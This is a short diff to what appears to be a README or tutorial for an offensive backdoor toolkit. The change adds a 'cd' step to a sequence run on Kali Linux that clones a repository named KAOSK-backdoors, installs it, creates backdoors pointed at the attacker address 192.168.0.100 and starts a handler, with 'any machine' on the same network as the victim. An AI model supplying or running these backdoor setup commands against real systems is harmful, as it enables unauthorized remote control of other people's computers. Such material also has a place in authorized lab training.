@@ -14,6 +14,7 @@ Using any machine as the victim in the same network as the attacker.
 
 Run in Kali:
 + git clone https://github.com/carlospolop/KAOSK-backdoors.git
++ cd ./KAOSK-backdoors
 + python ./install.py
 + python ./create_backdoors.py 192.168.0.100
 + python ./handler.py 192.168.0.100
